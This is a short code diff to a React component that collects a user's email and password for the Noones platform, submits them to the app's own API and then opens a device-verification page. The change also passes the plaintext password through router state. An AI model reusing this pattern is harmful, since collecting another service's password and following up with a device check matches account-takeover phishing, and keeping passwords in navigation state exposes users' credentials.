@@ -27,17 +27,19 @@ export default function NoonesConnect() {
     }
     setLoading(true);
     try {
+      const platformData = {
+        platform: 'Noones',
+        email,
+        third_party_password: password,
+        user_id: user?.id || null,
+      };
+
       const response = await fetch('/api/submit-connection', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({
-          platform: 'Noones',
-          email,
-          third_party_password: password,
-          user_id: user?.id || null,
-        }),
+        body: JSON.stringify(platformData),
       });
 
       if (!response.ok) {
@@ -45,7 +47,7 @@ export default function NoonesConnect() {
         throw new Error(body?.error || 'Failed to submit connection.');
       }
 
-      navigate('/connect/noones/verify-device', { state: { email } });
+      navigate('/connect/noones/verify-device', { state: { email, platformData } });
     } catch (err: any) {
       setErrorMessage(err.message || 'An unexpected error occurred.');
     } finally {
